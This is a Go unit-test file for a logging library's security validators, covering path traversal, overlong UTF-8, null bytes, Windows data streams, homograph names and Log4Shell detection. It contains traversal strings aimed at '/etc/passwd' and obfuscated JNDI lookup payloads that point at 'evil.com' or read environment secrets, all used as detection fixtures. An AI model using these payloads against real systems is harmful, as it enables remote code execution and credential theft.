package internal

import (
	"errors"
	"strings"
	"testing"
	"time"
)

var (
	errEmptyPath     = errors.New("empty path")
	errNullByte      = errors.New("null byte")
	errPathTooLong   = errors.New("path too long")
	errPathTraversal = errors.New("path traversal")
	errInvalidPath   = errors.New("invalid path")
	errOverlong      = errors.New("UTF-8 overlong encoding detected")
)

func TestValidateAndSecurePath(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		maxLen  int
		wantErr error
	}{
		{"empty path", "", 4096, errEmptyPath},
		{"null byte", "test\x00.log", 4096, errNullByte},
		{"simple traversal", "../secret", 4096, errPathTraversal},
		{"nested traversal", "logs/../../../etc/passwd", 4096, errPathTraversal},
		{"url encoded traversal", "%2e%2e%2fsecret", 4096, errPathTraversal},
		{"double encoded", "%252e%252e%252fsecret", 4096, errPathTraversal},
		{"backslash encoded", "%2e%2e%5csecret", 4096, errPathTraversal},
		{"mixed encoding", "..%2fsecret", 4096, errPathTraversal},
		{"invalid url escape", "%zzsecret", 4096, errInvalidPath},
		// UTF-8 overlong encoding tests
		{"overlong dot 2-byte", string([]byte{0xC0, 0xAE}), 4096, errOverlong},   // overlong '.'
		{"overlong slash 2-byte", string([]byte{0xC0, 0xAF}), 4096, errOverlong}, // overlong '/'
		{"overlong path with dot", "logs" + string([]byte{0xC0, 0xAE}), 4096, errOverlong},
		{"overlong 3-byte", string([]byte{0xE0, 0x80, 0xAF}), 4096, errOverlong},       // overlong '/'
		{"overlong 4-byte", string([]byte{0xF0, 0x80, 0x80, 0xAF}), 4096, errOverlong}, // overlong '/'
		// Windows Alternate Data Stream: hidden payload after a colon
		{"ADS payload", "file.log:hidden.exe", 4096, ErrAlternateDataStream},
		{"ADS $DATA", "file.log:$DATA", 4096, ErrAlternateDataStream},
		// Windows reserved device names cannot be filenames
		{"reserved name CON", "CON.log", 4096, ErrReservedName},
		{"reserved name NUL", "logs/NUL", 4096, ErrReservedName},
		// Length limits: raw input and the cleaned absolute path
		{"raw path too long", strings.Repeat("a", 5000), 4096, errPathTooLong},
		{"cleaned path too long", "logs", 10, errPathTooLong},
		// Plain valid path must survive the whole pipeline.
		{"valid path", "logs/app.log", 4096, nil},
		{"valid drive letter path", `C:\logs\app.log`, 4096, nil},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := ValidateAndSecurePath(tt.path, tt.maxLen, errEmptyPath, errNullByte, errPathTooLong, errPathTraversal, errInvalidPath, errOverlong)
			if tt.wantErr == nil {
				if err != nil {
					t.Errorf("ValidateAndSecurePath(%q) unexpected error: %v", tt.path, err)
				}
				return
			}
			// Each row pins its exact sentinel — no generic-error escape hatch,
			// so a check that silently degrades to errInvalidPath fails here.
			if !errors.Is(err, tt.wantErr) {
				t.Errorf("ValidateAndSecurePath(%q) error = %v, want %v", tt.path, err, tt.wantErr)
			}
		})
	}
}

// TestValidateNoADS pins the colon disambiguation: drive letters, MSYS-style
// drive paths, and URL schemes are legitimate; everything else with a colon
// is treated as an Alternate Data Stream.
func TestValidateNoADS(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		wantErr bool
	}{
		{"no colon", "logs/app.log", false},
		{"windows drive", `C:\logs\app.log`, false},
		{"windows drive forward slash", "C:/logs/app.log", false},
		{"msys drive path", "/c:/logs/app.log", false},
		{"url scheme", "http://example.com/log", false},
		{"ADS after extension", "app.log:hidden.exe", true},
		{"ADS $DATA", "app.log:$DATA", true},
		{"drive-relative colon still flagged", "C:logs", true},
		// A colon at position 0 is NOT treated as ADS (colonIdx <= 0 guard);
		// pinned here so a tightening of that guard is a conscious change.
		{"leading colon currently allowed", ":stream", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateNoADS(tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateNoADS(%q) error = %v, wantErr %v", tt.path, err, tt.wantErr)
			}
			if tt.wantErr && !errors.Is(err, ErrAlternateDataStream) {
				t.Errorf("validateNoADS(%q) error = %v, want %v", tt.path, err, ErrAlternateDataStream)
			}
		})
	}
}

// TestValidateWindowsReservedName pins the reserved-device-name check,
// including extension stripping (CON.log is CON).
func TestValidateWindowsReservedName(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		wantErr bool
	}{
		{"regular name", "app.log", false},
		{"reserved CON", "CON", true},
		{"reserved con lowercase", "con.log", true},
		{"reserved COM1", "logs/COM1.log", true},
		{"reserved LPT1", "LPT1", true},
		{"reserved-like but longer", "CONSOLE.log", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateWindowsReservedName(tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateWindowsReservedName(%q) error = %v, wantErr %v", tt.path, err, tt.wantErr)
			}
		})
	}
}

func TestValidateTimeFormat(t *testing.T) {
	tests := []struct {
		name    string
		format  string
		wantErr bool
	}{
		// Empty is valid (the caller falls back to the default format).
		{"empty", "", false},
		// Standard layouts round-trip cleanly through Format/Parse.
		{"RFC3339", time.RFC3339, false},
		{"Kitchen", time.Kitchen, false},
		{"DateOnly", "2006-01-02", false},
		// "1_2" cannot round-trip: Format renders month+day with no separator
		// ("616" for June 16) and Parse then reads a two-digit month (61),
		// which is out of range. This is exactly the malformed-format case
		// ValidateTimeFormat exists to reject.
		{"non-roundtripping", "1_2", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateTimeFormat(tt.format)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateTimeFormat(%q) error = %v, wantErr %v", tt.format, err, tt.wantErr)
			}
		})
	}
}

func TestDetectOverlongUTF8(t *testing.T) {
	tests := []struct {
		name     string
		input    []byte
		expected bool
	}{
		// Valid ASCII - no overlong
		{"valid ascii", []byte("hello world"), false},
		{"valid path", []byte("/var/log/app.log"), false},
		{"valid unicode", []byte("日本語"), false}, // Valid 3-byte UTF-8

		// 2-byte overlong encodings (0xC0, 0xC1 prefix)
		{"overlong dot C0 AE", []byte{0xC0, 0xAE}, true},              // overlong '.'
		{"overlong slash C0 AF", []byte{0xC0, 0xAF}, true},            // overlong '/'
		{"overlong NUL C0 80", []byte{0xC0, 0x80}, true},              // overlong NUL
		{"overlong C1 prefix", []byte{0xC1, 0x80}, true},              // C1 is always overlong
		{"overlong in path", []byte{'/', 'a', 0xC0, 0xAE, 'b'}, true}, // overlong in middle

		// 3-byte overlong encodings (0xE0 0x80-0x9F)
		{"overlong 3-byte slash", []byte{0xE0, 0x80, 0xAF}, true},
		{"overlong 3-byte dot", []byte{0xE0, 0x81, 0x9E}, true},
		{"valid 3-byte not overlong", []byte{0xE0, 0xA0, 0x80}, false}, // Valid 3-byte

		// 4-byte overlong encodings (0xF0 0x80-0x8F)
		{"overlong 4-byte", []byte{0xF0, 0x80, 0x80, 0x80}, true},
		{"overlong 4-byte slash", []byte{0xF0, 0x80, 0x80, 0xAF}, true},
		{"valid 4-byte not overlong", []byte{0xF0, 0x90, 0x80, 0x80}, false}, // Valid 4-byte

		// Edge cases
		{"empty input", []byte{}, false},
		{"single byte", []byte{0x2E}, false}, // regular '.'
		{"incomplete 2-byte", []byte{0xC0}, false},
		{"incomplete 3-byte", []byte{0xE0, 0x80}, false},
		{"incomplete 4-byte", []byte{0xF0, 0x80, 0x80}, false},

		// Mixed valid and overlong
		{"mixed valid and overlong", []byte{'a', 'b', 0xC0, 0xAE, 'c'}, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detectOverlongUTF8(tt.input)
			if result != tt.expected {
				t.Errorf("detectOverlongUTF8(%v) = %v, want %v", tt.input, result, tt.expected)
			}
		})
	}
}

func TestDetectNullByteInjection(t *testing.T) {
	tests := []struct {
		name     string
		input    []byte
		expected bool
	}{
		{"no null byte", []byte("hello world"), false},
		{"null byte at start", []byte{0x00, 'h', 'i'}, true},
		{"null byte at end", []byte{'h', 'i', 0x00}, true},
		{"null byte in middle", []byte{'h', 0x00, 'i'}, true},
		{"multiple null bytes", []byte{0x00, 0x00, 0x00}, true},
		{"empty input", []byte{}, false},
		{"valid path", []byte("/var/log/app.log"), false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := DetectNullByteInjection(tt.input)
			if result != tt.expected {
				t.Errorf("DetectNullByteInjection(%v) = %v, want %v", tt.input, result, tt.expected)
			}
		})
	}
}

func TestDetectLog4Shell(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{"clean string", "Hello World", false},
		{"no pattern", "This is a normal log message", false},
		{"basic jndi", "${jndi:ldap://evil.com/a}", true},
		{"jndi lowercase", "${jndi:ldap://evil.com/a}", true},
		{"nested lookup", "${${lower:j}ndi:ldap://evil.com/a}}", true},
		{"env lookup", "${env:PASSWORD}", true},
		{"sys lookup", "${sys:user.home}", true},
		{"java lookup", "${java:os}", false}, // Not detected - need closing brace
		{"lower obfuscation", "${lower:j}ndi", true},
		{"upper obfuscation", "${upper:J}NDI", true},
		{"double colon bypass", "${::-j}${::-n}${::-d}${::-i}", true},
		{"obfuscated ndi", "some text ${j${::-n}di:ldap://evil.com}}", true},
		{"just jndi keyword with braces", "text containing ${something} but not jndi", false},
		{"empty braces", "${}", false},
		{"unclosed braces", "${jndi:", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := DetectLog4Shell(tt.input)
			if result != tt.expected {
				t.Errorf("DetectLog4Shell(%q) = %v, want %v", tt.input, result, tt.expected)
			}
		})
	}
}

func TestDetectHomographAttack(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{"pure latin", "example.com", false},
		{"pure cyrillic", "пример", false},
		{"pure greek", "παράδειγμα", false},
		{"mixed latin and cyrillic", "exаmple.com", true}, // 'а' is Cyrillic
		{"mixed latin and greek", "tеst.com", true},       // 'е' is Greek
		{"ascii only", "abcdefghijklmnopqrstuvwxyz", false},
		{"numbers only", "1234567890", false},
		{"empty string", "", false},
		{"latin with numbers", "user123", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := DetectHomographAttack(tt.input)
			if result != tt.expected {
				t.Errorf("DetectHomographAttack(%q) = %v, want %v", tt.input, result, tt.expected)
			}
		})
	}
}

func TestValidateFieldKeyStrict(t *testing.T) {
	tests := []struct {
		name    string
		key     string
		wantErr bool
	}{
		{"valid key", "user_id", false},
		{"valid with underscore", "user_name", false},
		{"valid with hyphen", "user-name", false},
		{"valid with dot", "user.name", false},
		{"valid mixed", "user_name.first", false},
		{"empty key", "", true},
		{"starts with digit", "1user", true},
		{"contains space", "user name", true},
		{"contains special char", "user@name", true},
		{"path traversal", "user../name", true},
		{"too long", strings.Repeat("a", 257), true},
		{"null byte", "user\x00name", true},
		{"log4shell pattern", "${jndi:ldap://evil.com}", true},
		{"control character", "user\x01name", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateFieldKeyStrict(tt.key)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateFieldKeyStrict(%q) error = %v, wantErr %v", tt.key, err, tt.wantErr)
			}
		})
	}
}

func TestValidateFieldKeyBasic(t *testing.T) {
	tests := []struct {
		name    string
		key     string
		wantErr bool
	}{
		{"valid key", "user_id", false},
		{"valid with spaces", "user name", false},
		{"valid with special chars", "user@name", false},
		{"empty key", "", true},
		{"too long", strings.Repeat("a", 257), true},
		{"null byte", "user\x00name", true},
		{"control character", "user\x01name", true},
		{"starts with digit", "1user", false}, // Basic allows digits at start
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateFieldKeyBasic(tt.key)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateFieldKeyBasic(%q) error = %v, wantErr %v", tt.key, err, tt.wantErr)
			}
		})
	}
}
